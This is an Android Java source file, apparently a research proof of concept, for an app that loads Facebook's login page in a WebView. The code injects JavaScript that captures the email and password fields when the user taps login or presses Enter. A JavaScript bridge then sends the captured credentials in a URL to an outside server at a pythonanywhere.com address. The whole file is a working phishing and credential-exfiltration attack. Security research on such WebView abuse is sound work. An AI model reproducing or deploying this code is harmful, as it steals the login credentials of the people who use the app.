package saarland.cispa.phishingapp;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;


public class PhishingWebView extends Activity {

    private static String jscode = "" +
            "       function leakcred(){" +
            "           var user = document.getElementById('m_login_email').value;\n" +
            "           var pwd = document.getElementById('m_login_password').value;\n" +
            "           myinterface.leak('username=' + user + '&password='+ pwd);\n" +
            "" +
            "        };\n" +
            "       document.getElementById('login_top_banner').remove();\n" +
            "       document.getElementsByName('login')[0].ontouchstart = leakcred;\n" +
            "       document.onkeypress = function(e) {" +
            "           if(e.keyCode == 13){" +
            "               leakcred();" +
            "           }" +
            "       }";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Use WebView to display facebook login page
        setContentView(R.layout.webview);
        WebView WV = findViewById(R.id.webview);
        WV.getSettings().setJavaScriptEnabled(true);
        WV.getSettings().setDisplayZoomControls(false);
        // Use Custom WebViewClient to execute JavaScript-Code onPageFinished
        WV.setWebViewClient(new MyWebViewClient());
        // add JSInterface to send credentials to server ( can also be done via xhr )
        WV.addJavascriptInterface(new MyJavascriptInterface(), "myinterface");

        Intent incoming = getIntent();
        Uri uri = incoming.getData();
        Log.i("PHISH", "User visited: " + uri.toString());
        if (uri.toString().contains("facebook.com")) {
            WV.loadUrl("https://facebook.com");
        } else if(uri.toString().contains("densi97.pythonanywhere.com")){
            WV.loadUrl("https://densi97.pythonanywhere.com/poc/");
        } else {
            WV.loadUrl(uri.toString());
        }
    }


    private class MyWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            Log.i("PHISH", "requested URL: " + request.getUrl().toString());
            if (request != null && request.getUrl().toString().equals("javascript:alert(1)")) {
                return false;
            } else if (request != null && request.getUrl().toString().contains("facebook.com")) {
                return false;
            } else {
                view.getContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(request.getUrl().toString())));
                return true;
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            if (url.contains("facebook.com")) {
                view.evaluateJavascript(jscode, null);
            }
        }
    }

    private class MyJavascriptInterface {

        @JavascriptInterface
        public void leak(String s) {
            Log.i("PHISH", "LEAKED: " + s);
            String url = "https://densi97.pythonanywhere.com/leaked?" + s;
            OkHttpClient client = new OkHttpClient();

            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    call.cancel();
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {

                    final String myResponse = response.body().string();

                    PhishingWebView.this.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {

                        }
                    });

                }
            });

        }
    }
}